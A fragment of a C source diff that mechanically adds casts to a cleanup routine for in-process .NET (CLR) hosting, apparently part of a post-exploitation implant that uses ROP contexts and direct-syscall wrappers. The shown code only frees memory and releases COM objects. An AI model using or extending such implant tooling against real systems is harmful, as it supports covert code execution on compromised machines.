+        ((INSTANCE *)Instance)->Dotnet->RopInit = NULL;
     }
 
-    if ( Instance->Dotnet->RopInvk )
+    if ( ((INSTANCE *)Instance)->Dotnet->RopInvk )
     {
-        MemSet( Instance->Dotnet->RopInvk, 0, sizeof( CONTEXT ) );
-        Instance->Win32.LocalFree( Instance->Dotnet->RopInvk );
-        Instance->Dotnet->RopInvk = NULL;
+        MemSet( ((INSTANCE *)Instance)->Dotnet->RopInvk, 0, sizeof( CONTEXT ) );
+        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopInvk );
+        ((INSTANCE *)Instance)->Dotnet->RopInvk = NULL;
     }
 
-    if ( Instance->Dotnet->RopEvnt )
+    if ( ((INSTANCE *)Instance)->Dotnet->RopEvnt )
     {
-        MemSet( Instance->Dotnet->RopEvnt, 0, sizeof( CONTEXT ) );
-        Instance->Win32.LocalFree( Instance->Dotnet->RopEvnt );
-        Instance->Dotnet->RopEvnt = NULL;
+        MemSet( ((INSTANCE *)Instance)->Dotnet->RopEvnt, 0, sizeof( CONTEXT ) );
+        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopEvnt );
+        ((INSTANCE *)Instance)->Dotnet->RopEvnt = NULL;
     }
 
-    if ( Instance->Dotnet->RopExit )
+    if ( ((INSTANCE *)Instance)->Dotnet->RopExit )
     {
-        MemSet( Instance->Dotnet->RopExit, 0, sizeof( CONTEXT ) );
-        Instance->Win32.LocalFree( Instance->Dotnet->RopExit );
-        Instance->Dotnet->RopExit = NULL;
+        MemSet( ((INSTANCE *)Instance)->Dotnet->RopExit, 0, sizeof( CONTEXT ) );
+        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopExit );
+        ((INSTANCE *)Instance)->Dotnet->RopExit = NULL;
     }
 
     PUTS( "Free Output" )
-    if ( Instance->Dotnet->Output.Buffer )
+    if ( ((INSTANCE *)Instance)->Dotnet->Output.Buffer )
     {
-        MemSet( Instance->Dotnet->Output.Buffer, 0, Instance->Dotnet->Output.Length );
-        Instance->Win32.LocalFree( Instance->Dotnet->Output.Buffer );
-        Instance->Dotnet->Output.Buffer = NULL;
+        MemSet( ((INSTANCE *)Instance)->Dotnet->Output.Buffer, 0, ((INSTANCE *)Instance)->Dotnet->Output.Length );
+        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->Output.Buffer );
+        ((INSTANCE *)Instance)->Dotnet->Output.Buffer = NULL;
     }
 
     PUTS( "Unload and free CLR" )
-    if ( Instance->Dotnet->MethodArgs )
+    if ( ((INSTANCE *)Instance)->Dotnet->MethodArgs )
     {
-        Instance->Win32.SafeArrayDestroy( Instance->Dotnet->MethodArgs );
-        Instance->Dotnet->MethodArgs = NULL;
+        ((INSTANCE *)Instance)->Win32.SafeArrayDestroy( ((INSTANCE *)Instance)->Dotnet->MethodArgs );
+        ((INSTANCE *)Instance)->Dotnet->MethodArgs = NULL;
     }
 
-    if ( Instance->Dotnet->MethodInfo != NULL )
+    if ( ((INSTANCE *)Instance)->Dotnet->MethodInfo != NULL )
     {
-        Instance->Dotnet->MethodInfo->lpVtbl->Release( Instance->Dotnet->MethodInfo );
-        Instance->Dotnet->MethodInfo = NULL;
+        ((INSTANCE *)Instance)->Dotnet->MethodInfo->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->MethodInfo );
+        ((INSTANCE *)Instance)->Dotnet->MethodInfo = NULL;
     }
 
-    if ( Instance->Dotnet->Assembly != NULL )
+    if ( ((INSTANCE *)Instance)->Dotnet->Assembly != NULL )
     {
-        Instance->Dotnet->Assembly->lpVtbl->Release( Instance->Dotnet->Assembly );
-        Instance->Dotnet->Assembly = NULL;
+        ((INSTANCE *)Instance)->Dotnet->Assembly->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->Assembly );
+        ((INSTANCE *)Instance)->Dotnet->Assembly = NULL;
     }
 
-    if ( Instance->Dotnet->AppDomain )
+    if ( ((INSTANCE *)Instance)->Dotnet->AppDomain )
     {
-        Instance->Dotnet->AppDomain->lpVtbl->Release( Instance->Dotnet->AppDomain );
-        Instance->Dotnet->AppDomain = NULL;
+        ((INSTANCE *)Instance)->Dotnet->AppDomain->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->AppDomain );
+        ((INSTANCE *)Instance)->Dotnet->AppDomain = NULL;
     }
 
-    if ( Instance->Dotnet->AppDomainThunk != NULL )
+    if ( ((INSTANCE *)Instance)->Dotnet->AppDomainThunk != NULL )
     {
-        Instance->Dotnet->AppDomainThunk->lpVtbl->Release( Instance->Dotnet->AppDomainThunk );
+        ((INSTANCE *)Instance)->Dotnet->AppDomainThunk->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->AppDomainThunk );
     }
 
-    if ( Instance->Dotnet->ICorRuntimeHost )
+    if ( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost )
     {
-        Instance->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainThunk );
-        Instance->Dotnet->ICorRuntimeHost->lpVtbl->Stop( Instance->Dotnet->ICorRuntimeHost );
-        Instance->Dotnet->ICorRuntimeHost = NULL;
+        ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost, ((INSTANCE *)Instance)->Dotnet->AppDomainThunk );
+        ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost->lpVtbl->Stop( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost );
+        ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost = NULL;
     }
 
-    if ( Instance->Dotnet->ClrRuntimeInfo != NULL )
+    if ( ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo != NULL )
     {
-        Instance->Dotnet->ClrRuntimeInfo->lpVtbl->Release( Instance->Dotnet->ClrRuntimeInfo );
-        Instance->Dotnet->ClrRuntimeInfo = NULL;
+        ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo );
+        ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo = NULL;
     }
 
-    if ( Instance->Dotnet->MetaHost != NULL )
+    if ( ((INSTANCE *)Instance)->Dotnet->MetaHost != NULL )
     {
-        Instance->Dotnet->MetaHost->lpVtbl->Release( Instance->Dotnet->MetaHost );
-        Instance->Dotnet->MetaHost = NULL;
+        ((INSTANCE *)Instance)->Dotnet->MetaHost->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->MetaHost );
+        ((INSTANCE *)Instance)->Dotnet->MetaHost = NULL;
     }
 
-    if ( Instance->Dotnet->Thread ) {
-        SysNtTerminateThread( Instance->Dotnet->Thread, 0 );
-        SysNtClose( Instance->Dotnet->Thread );
+    if ( ((INSTANCE *)Instance)->Dotnet->Thread ) {
+        SysNtTerminateThread( ((INSTANCE *)Instance)->Dotnet->Thread, 0 );
+        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Thread );
     }
 
-    if ( Instance->Dotnet->Exit ) {
-        SysNtClose( Instance->Dotnet->Exit );
+    if ( ((INSTANCE *)Instance)->Dotnet->Exit ) {
+        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Exit );
     }
 
-    if ( Instance->Dotnet ) {
-        MemSet( Instance->Dotnet, 0, sizeof( DOTNET_ARGS ) );
-        MmHeapFree( Instance->Dotnet );
-        Instance->Dotnet = NULL;
+    if ( ((INSTANCE *)Instance)->Dotnet ) {
+        MemSet( ((INSTANCE *)Instance)->Dotnet, 0, sizeof( DOTNET_ARGS ) );
+        MmHeapFree( ((INSTANCE *)Instance)->Dotnet );
+        ((INSTANCE *)Instance)->Dotnet = NULL;
     }
 }
 
@@ -527,7 +527,7 @@ DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PI
 
     if ( RtMscoree() )
     {
-        if ( Instance->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost ) == S_OK )
+        if ( ((INSTANCE *)Instance)->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost ) == S_OK )
         {
             if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
             {
